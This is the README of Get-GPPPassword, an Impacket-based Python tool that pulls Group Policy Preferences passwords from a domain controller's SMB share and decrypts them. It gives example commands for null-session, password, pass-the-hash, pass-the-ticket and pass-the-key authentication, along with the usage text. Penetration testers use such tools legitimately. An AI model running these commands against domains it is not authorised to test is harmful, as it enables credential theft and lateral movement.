# Get-GPPPassword

Python script for extracting and decrypting Group Policy Preferences passwords, using Impacket's lib, and using streams for carving files instead of mounting shares

## Examples

NULL session

````shell
python3 Get-GPPPassword.py -no-pass domain_controller
````

Username, password

````shell
python3 Get-GPPPassword.py domain.local/someuser:somepassword@domain_controller
````

Pass-the-hash

````shell
python3 Get-GPPPassword.py -hashes [LMhash]:NThash domain.local/someuser@domain_controller
````

Pass-the-ticket

````shell
export KRB5CCNAME=someuser.ccache
python3 Get-GPPPassword.py -k domain_controller
````

Pass-the-key

````shell
python3 Get-GPPPassword.py -aesKey aesKey domain.local/someuser@domain_controller
````

Overpass-the-hash

````shell
python3 Get-GPPPassword.py -k -hashes [LMhash]:NThash domain.local/someuser@domain_controller
````

## Usage

```
usage: Get-GPPPassword.py [-h] [-share SHARE] [-base-dir BASE_DIR] [-ts]
                          [-debug] [-hashes LMHASH:NTHASH] [-no-pass] [-k]
                          [-aesKey hex key] [-dc-ip ip address]
                          [-target-ip ip address] [-port [destination port]]
                          target

Group Policy Preferences passwords finder and decryptor

positional arguments:
  target                [[domain/]username[:password]@]<targetName or address>

optional arguments:
  -h, --help            show this help message and exit
  -share SHARE          SMB Share
  -base-dir BASE_DIR    Directory to search in (Default: /)
  -ts                   Adds timestamp to every logging output
  -debug                Turn DEBUG output ON

authentication:
  -hashes LMHASH:NTHASH
                        NTLM hashes, format is LMHASH:NTHASH
  -no-pass              don't ask for password (useful for -k)
  -k                    Use Kerberos authentication. Grabs credentials from
                        ccache file (KRB5CCNAME) based on target parameters.
                        If valid credentials cannot be found, it will use the
                        ones specified in the command line
  -aesKey hex key       AES key to use for Kerberos Authentication (128 or 256
                        bits)

connection:
  -dc-ip ip address     IP Address of the domain controller. If omitted it
                        will use the domain part (FQDN) specified in the
                        target parameter
  -target-ip ip address
                        IP Address of the target machine. If omitted it will
                        use whatever was specified as target. This is useful
                        when target is the NetBIOS name and you cannot resolve
                        it
  -port [destination port]
                        Destination port to connect to SMB Server
```

# Credits

Thanks to :
- [mxrch](https://twitter.com/mxrchreborn) for the code allowing to read files in stream instead of downloading them.
- [Impacket](https://github.com/SecureAuthCorp/impacket) for handling the connections, auth, socket parts.
- [Microsoft](https://www.youtube.com/watch?v=dQw4w9WgXcQ) for [releasing the AES encryption key](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-gppref/2c15cbf0-f086-4c74-8b70-1f2fa45dd4be) for the cpasswords.
- the best, [@podalirius_](https://twitter.com/@podalirius_) for coding almost everything that my 5-year-old brain couldn't.

# ToDo list
- GIF in the README
